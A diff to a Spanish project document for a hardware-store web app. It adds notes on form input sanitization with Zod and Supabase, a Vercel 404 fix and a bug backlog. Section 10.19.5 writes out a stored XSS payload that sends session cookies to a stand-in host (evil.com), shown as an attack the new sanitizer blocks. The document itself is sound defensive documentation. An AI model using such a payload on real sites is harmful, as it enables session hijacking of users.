@@ -581,6 +581,132 @@ flowchart LR
 
 ---
 
+## 10.19 Hardening de Seguridad: Sanitización de Entradas
+
+> **Objetivo:** reducir hasta un nivel seguro la presencia de cadenas maliciosas, caracteres de control y vectores de inyección (XSS, HTML injection, header injection, SQL noise) en **TODOS** los formularios de la plataforma — análogo a la *sanitización sanitaria*: no se busca esterilizar, se busca **bajar la carga de "patógenos" a un umbral inocuo** antes de que toquen la base de datos o sean reenviados a otro usuario.
+
+### 10.19.1 ¿Qué teníamos ANTES?
+
+| Riesgo | Estado anterior | Consecuencia potencial |
+|--------|-----------------|------------------------|
+| Inyección HTML/JS en `full_name`, `email`, mensajes de contacto | El valor se enviaba **tal cual** a Supabase con `setState(e.target.value)` | XSS almacenado: otro usuario abre el panel y ejecuta script del atacante. |
+| Caracteres de control invisibles (`\u0000-\u001F`) | No se filtraban | Corrupción visual, *log injection*, bypass de validaciones por igualdad. |
+| Emails con mayúsculas / espacios | Se guardaban literales | Duplicidad de cuentas (`Juan@x.com` ≠ `juan@x.com`) y fallos de login. |
+| Contraseña sin longitud máxima | Acepta cadenas gigantes (DoS por hash) | Saturación de CPU al hashear (bcrypt es O(n)). |
+| Validación únicamente con `required` HTML | El navegador es la única defensa | Bypass trivial con DevTools o `curl`. |
+| Mensajes de error genéricos del backend | "Invalid login credentials" en inglés | UX confusa y filtración de info técnica. |
+
+### 10.19.2 ¿Qué se implementó AHORA?
+
+Se creó un **módulo central de sanitización + validación** en `src/lib/sanitize.ts` que actúa como **primera barrera** antes de que cualquier dato salga del navegador. Filosofía: *defense in depth*. La sanitización **no reemplaza** RLS ni constraints SQL; las **complementa**.
+
+```
+┌──────────────┐   ┌────────────────┐   ┌──────────────┐   ┌─────────────┐
+│ <Input> JSX  │ → │ sanitize*()    │ → │ Zod schema   │ → │ Supabase    │
+│  (onChange)  │   │ (regex limpia) │   │ (validación) │   │ + RLS + SQL │
+└──────────────┘   └────────────────┘   └──────────────┘   └─────────────┘
+      L1                  L2                   L3                 L4
+```
+
+**Capas:**
+- **L1 — `<Input>`**: `maxLength`, `autoComplete`, `type` correctos. Bloquea pegar 5 MB de basura.
+- **L2 — `sanitize*()`**: elimina control chars, etiquetas `<...>`, `javascript:`, handlers inline (`onclick=`), colapsa espacios y normaliza emails/teléfonos.
+- **L3 — Zod**: contrato fuerte (formato email, regex de nombre, longitud mínima/máxima, confirmación de password).
+- **L4 — Postgres + RLS**: última línea — políticas por rol y constraints `NOT NULL`/`CHECK`.
+
+### 10.19.3 Funciones expuestas
+
+| Función | Qué limpia | Donde se usa |
+|---------|-----------|--------------|
+| `sanitizeText(input, max=500)` | Control chars · tags HTML · `javascript:` · `on*=` handlers · espacios múltiples · longitud | Nombres, mensajes, descripciones |
+| `sanitizeEmail(input)` | `sanitizeText` + lowercase + sin espacios + máx 254 chars (RFC 5321) | Login, registro, contacto |
+| `sanitizePhone(input)` | Permite solo `0-9 + - ( ) espacio`, máx 20 chars | Registro, perfil, checkout |
+| `loginSchema` | Zod: email válido + password 1–128 | `LoginPage` |
+| `registerSchema` | Zod: fullName regex Unicode, email, password ≥ 6, confirmación | `RegisterPage` |
+
+### 10.19.4 Dónde se aplicó
+
+| Página / Componente | Campos protegidos | Resultado |
+|---------------------|-------------------|-----------|
+| `src/features/auth/pages/LoginPage.tsx` | `email`, `password` | Normaliza email en cada tecla y valida con Zod antes de tocar la red. Mensajes de error en español. |
+| `src/features/auth/pages/RegisterPage.tsx` | `fullName`, `email`, `password`, `confirmPassword` | Bloquea HTML en el nombre, exige confirmación, limita 128 chars en password. |
+
+> 🔜 **Próxima ola** (planificada): `ContactPage`, `AccountPage`, `CheckoutPage`, formularios admin (productos, clientes, proveedores). El módulo `sanitize.ts` ya está listo para reutilizarse: basta importar y enchufar.
+
+### 10.19.5 Ejemplo concreto — ataque mitigado
+
+**Antes:**
+```
+Nombre: <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
+→ guardado tal cual en `profiles.full_name`
+→ render en panel admin ejecuta el script
+→ exfiltración de la cookie de sesión
+```
+
+**Después:**
+```ts
+sanitizeText('<img src=x onerror="...">')  // → "" (limpio)
+fullNameSchema.parse("")                   // → ZodError: "El nombre es muy corto"
+// El formulario muestra el error y NO se llama a supabase.auth.signUp()
+```
+
+---
+
+## 10.20 Estabilidad: F5 ya no muestra 404
+
+**Problema previo.** En Vercel, al hacer **F5** en cualquier ruta interna (ej. `/admin/productos`, `/cuenta`) se mostraba **404: NOT_FOUND**. Causa: Vercel buscaba un archivo físico `/admin/productos.html` que no existe — la app es **SPA** y el ruteo es del lado cliente.
+
+**Solución (doble cinturón):**
+
+1. **`vercel.json` — rewrite catch-all** para que cualquier ruta sirva `index.html` y React Router resuelva en el cliente:
+   ```json
+   {
+     "rewrites": [
+       { "source": "/(.*)", "destination": "/index.html" }
+     ]
+   }
+   ```
+2. **`HashRouter`** en `src/App.tsx` como red de seguridad — incluso si el rewrite fallara (otro hosting, preview no configurado, etc.), las URLs con `#` jamás generan 404 porque el servidor solo ve `/`.
+   ```tsx
+   import { HashRouter as BrowserRouter } from "react-router-dom";
+   ```
+
+**Resultado:** F5 funciona en **toda** ruta, tanto en preview como en producción.
+
+---
+
+## 10.21 Errores resueltos · Backlog de bugs por cazar
+
+### ✅ Resueltos en esta iteración
+
+| ID | Síntoma | Causa raíz | Fix |
+|----|---------|-----------|-----|
+| BUG-101 | F5 en `/admin/*` devolvía 404 | Vercel sin rewrite SPA | `vercel.json` + `HashRouter` |
+| BUG-102 | Registros nuevos no aparecían en `profiles` | Faltaba trigger `handle_new_user` tras reset | Migración con `CREATE TRIGGER on_auth_user_created` |
+| BUG-103 | Rol admin no se asignaba desde UI | Falta de grant + RLS en `user_roles` | Migración completa con `GRANT` y `has_role()` security definer |
+| BUG-104 | XSS potencial en nombres y correos | Sin sanitización ni validación Zod | Módulo `src/lib/sanitize.ts` aplicado en Login/Register |
+| BUG-105 | Login fallaba con `Juan@X.com` vs `juan@x.com` | Email case-sensitive | `sanitizeEmail()` normaliza a minúsculas |
+| BUG-106 | Mensaje "Invalid login credentials" en inglés | Error crudo de Supabase | Traducción a "Credenciales incorrectas" |
+
+### 🔎 Pendientes a auditar (próxima ola de QA)
+
+| ID | Sospecha | Plan |
+|----|----------|------|
+| BUG-201 | Sanitizar `ContactPage`, `AccountPage`, `CheckoutPage` y formularios admin | Reutilizar `sanitize.ts` |
+| BUG-202 | `CategoryBar` / mega-menú pierde scroll en móvil tras navegar | Revisar `overflow-x` y `position: sticky` |
+| BUG-203 | `useCart` puede desincronizarse si dos pestañas suman al carrito | Migrar a `BroadcastChannel` o `storage` event |
+| BUG-204 | Cuando una imagen de producto falla, no hay placeholder visible | Añadir `onError` con `/placeholder.svg` |
+| BUG-205 | POS no recalcula totales si cambia el tipo de cambio mientras hay items | Recalcular en efecto con `useEffect([rate])` |
+| BUG-206 | Notificaciones realtime se suscriben dos veces en HMR | Limpiar canal en `return () => channel.unsubscribe()` |
+| BUG-207 | Inputs de fecha en modo oscuro casi invisibles en Firefox | Añadir `color-scheme: dark` |
+| BUG-208 | Backup JSON no incluye `combos` ni `payment_accounts` | Ampliar `exportAll()` |
+| BUG-209 | `RolesPage` no refresca tras asignar admin (requiere F5) | Invalidar `queryClient.invalidateQueries(['user-roles'])` |
+| BUG-210 | `forgot-password` no valida que el email exista antes de enviar | UX: mensaje genérico siempre (anti-enumeración) ✅ correcto, pero documentar |
+
+> Reportar cualquier bug nuevo en GitHub Issues con plantilla `bug_report.md` (severidad, pasos para reproducir, esperado vs obtenido, screenshot).
+
+---
+
 ## 11. Evaluación de Cumplimiento CMMI
 
 | Área de Proceso | Nivel | Estado |
@@ -881,7 +1007,7 @@ El sistema cumple con los objetivos planteados y los lineamientos de **CMMI-DEV 
 ## 15. Anexos
 
 - **Evidencias Jira:** tableros y reportes de velocity.
-- **Capturas del Sistema:** ver carpeta https://drive.google.com/drive/folders/1xBSykE-jT6KWJYYXtF-XehdBqj7kM0P0?usp=sharing.
+- **Capturas del Sistema:** ver carpeta `docs/screenshots/`.
 - **Diagramas UML:** sección 10 de este documento.
 - **Evidencias de Testing:** reportes Vitest en CI.
 - **Enlace del Sistema:** https://ferreteria-dimar.vercel.app
